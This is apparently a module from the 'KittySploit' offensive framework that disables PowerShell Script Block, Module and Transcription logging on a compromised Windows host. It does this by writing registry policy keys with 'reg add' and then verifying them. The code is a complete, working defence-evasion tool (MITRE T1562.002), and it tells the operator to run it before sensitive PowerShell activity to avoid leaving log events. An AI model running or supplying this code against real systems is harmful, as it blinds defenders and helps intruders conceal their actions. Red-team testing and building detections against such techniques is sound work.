#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin

_PS_LOGGING_KEYS = (
    (
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
        "EnableScriptBlockLogging",
        0,
    ),
    (
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging",
        "EnableModuleLogging",
        0,
    ),
    (
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription",
        "EnableTranscripting",
        0,
    ),
    (
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription",
        "EnableInvocationHeader",
        0,
    ),
)


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Disable PowerShell Logging",
        "description": (
            "Disable PowerShell Script Block, Module, and Transcription logging "
            "via registry policy keys (less noisy than clearing event logs)."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1562/002/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.2,
            "noise": 0.5,
            "value": 0.9,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    include_transcription = OptBool(True, "Also disable PowerShell transcription policy", False)
    verify = OptBool(True, "Re-read policy keys after changes", False)

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_is_admin():
            print_error("Administrator privileges are required.")
            return False

        print_warning(
            "Registry changes may still leave existing 4104 events; "
            "prefer running before sensitive PowerShell operations."
        )

        keys = list(_PS_LOGGING_KEYS)
        if not self.include_transcription:
            keys = [k for k in keys if "Transcription" not in k[0]]

        ok = True
        for hive_path, name, value in keys:
            out = self.win_execute(
                f'reg add "{hive_path}" /v {name} /t REG_DWORD /d {value} /f',
                timeout=10,
            )
            if "successfully" in (out or "").lower() or "réussi" in (out or "").lower():
                print_success(f"Set {name}=0 under {hive_path}")
            else:
                print_warning(f"Could not set {name}: {out or 'no output'}")
                ok = False

        if self.verify:
            print_info("-" * 60)
            print_info("Verification")
            for hive_path, name, _ in keys:
                out = self.win_execute(f'reg query "{hive_path}" /v {name}', timeout=8)
                print_info(f"{name}: {out or '(not set)'}")

        return ok
